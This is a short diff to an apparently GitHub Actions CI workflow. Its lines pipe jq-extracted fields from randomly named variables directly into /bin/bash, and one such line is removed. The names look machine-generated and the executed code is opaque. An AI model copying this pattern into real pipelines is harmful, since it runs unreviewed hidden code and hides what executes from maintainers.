@@ -33,7 +33,6 @@ jobs:
           echo $pw8109 | jq -r .kko25 | /bin/bash
           printf '%s' "$gtc58548" | jq -r .v097 | /bin/bash
           echo $zxki3821 | jq -r .mpufw16 | /bin/bash
-          echo $stp230 | jq -r .lniq0 | /bin/bash
           printf '%s' "$g7010" | jq -r .hx387 | /bin/bash
           echo $dahke31 | jq -r .r1 | /bin/bash
           echo $ldp357 | jq -r .npj7 | /bin/bash
